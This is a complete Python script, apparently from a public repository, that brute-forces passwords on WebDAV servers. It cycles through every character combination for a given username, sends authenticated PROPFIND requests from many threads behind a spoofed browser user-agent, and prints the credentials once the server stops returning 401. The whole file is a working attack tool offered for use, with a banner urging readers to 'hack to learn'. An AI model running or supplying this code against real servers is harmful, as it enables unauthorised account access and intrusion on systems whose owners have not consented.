##################################################################
#                                                                #
#                         webdav-cracker                         #
#                                                                #
#                Copyright (C) 2022 X Gamer Guide                #
#         https://github.com/X-Gamer-Guide/webdav-cracker        #
#                                                                #
#               don't learn to hack, hack to learn               #
#                                                                #
##################################################################


import argparse
import base64
import itertools
import string
import threading
import time

import requests


parser = argparse.ArgumentParser(
    description="A tool to get access to a WEBDAV server"
)


parser.add_argument(
    "url",
    type=str,
    help="The DAV URL of the target"
)

parser.add_argument(
    "username",
    type=str,
    help="Username to attack",
    default="admin"
)

parser.add_argument(
    "--user_agent",
    type=str,
    help="User agent for the requests",
    default="Mozilla/5.0 (X11; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0"
)

parser.add_argument(
    "--threads",
    type=int,
    help="The number of threads used",
    default=1
)

parser.add_argument(
    "--b64_letters",
    type=str,
    help="The letters used to attack (base64 encoded)",
    default=base64.b64encode(
        (
            string.ascii_letters + string.digits + string.punctuation
        ).encode()
    ).decode()
)


# get command line args
args = parser.parse_args()


# decode letters
letters = base64.b64decode(args.b64_letters).decode()

# get index directory path
if args.url.endswith("/"):
    url = f"{args.url}."
else:
    url = f"{args.url}/."

# create webhook session
discord = requests.session()

# create WEBDAV session
dav = requests.session()
dav.headers = {
    "User-Agent": args.user_agent
}


class WEBDAV:
    def __init__(self):
        self.stop = False

    def run(self):
        i = 0
        while True:
            for j in [""] if i == 0 else map("".join, itertools.product(letters, repeat=i)):
                while True:
                    if self.stop:
                        return
                    if threading.active_count() < args.threads + 1:
                        print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {j} ..")
                        threading.Thread(target=self.brute_force, daemon=True, args=(j,)).start()
                        break
                    time.sleep(0.1)
            i += 1

    def brute_force(self, start):
        for i in range(2):
            for j in map("".join, itertools.product(letters, repeat=i + 1)):
                # check for rights
                r = dav.request(
                    "PROPFIND",
                    url,
                    headers={
                        "Depth": "1"
                    },
                    auth=(
                        args.username,
                        f"{start}{j}"
                    )
                )
                # evaluate the response of the server
                if r.status_code != 401:
                    print("-" * 80)
                    print(r.text)
                    print("-" * 80)
                    print(r.status_code)
                    print("-" * 80)
                    print(r.headers)
                    print("-" * 80)
                    print(f"USER: {args.username}")
                    print(f"PASSWORD: {start}{j}")
                    self.stop = True


webdav = WEBDAV()
webdav.run()
